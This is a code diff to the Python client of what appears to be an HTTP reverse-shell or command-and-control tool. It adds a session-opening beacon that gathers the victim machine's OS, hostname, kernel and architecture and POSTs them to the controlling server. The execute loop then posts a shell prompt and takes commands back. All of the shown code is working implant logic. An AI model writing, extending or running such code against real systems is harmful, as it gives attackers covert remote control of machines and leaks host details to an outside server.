@@ -5,6 +5,7 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 
 import getpass
 import http.client
+import json
 import os
 import platform
 import ssl
@@ -25,7 +26,16 @@ class ClientCommands:
 
     def _send(self, message: [str, bytes, dict], mode: str = "output") -> None:
         """Wrapper for the client's 'post' method."""
-        self.client.post({"output": message})
+        self.client.post({mode: message})
+
+    def open_session(self):
+        session_info = {
+            "OS": platform.system(),
+            "Hostname": platform.node(),
+            "Kernel": f"{platform.release()} {platform.version()} ",
+            "Platform": f"{platform.machine()}"
+        }
+        self._send(json.dumps(session_info), mode="open_session")
 
     def cd(self, dest_dir: [str, list]) -> None:
         """Handles change of working directory in the shell."""
@@ -76,7 +86,7 @@ class Client:
         """Returns a string containing shell prompt information in the
         format user@host:/path/to/cwd$"""
 
-        return f"{platform.node()}@{getpass.getuser()}:{str(Path.cwd())}$ "
+        return f"{getpass.getuser()}@{platform.node()}:{str(Path.cwd())}$ "
 
     def post(self, request_body: dict[str, str]) -> str:
         """Send a POST request to the server.
@@ -94,6 +104,7 @@ class Client:
                 .decode())
 
     def execute(self) -> None:
+        self.commands.open_session()
         while True:
             try:
                 response: str = self.post({"prompt": self._shell_prompt})
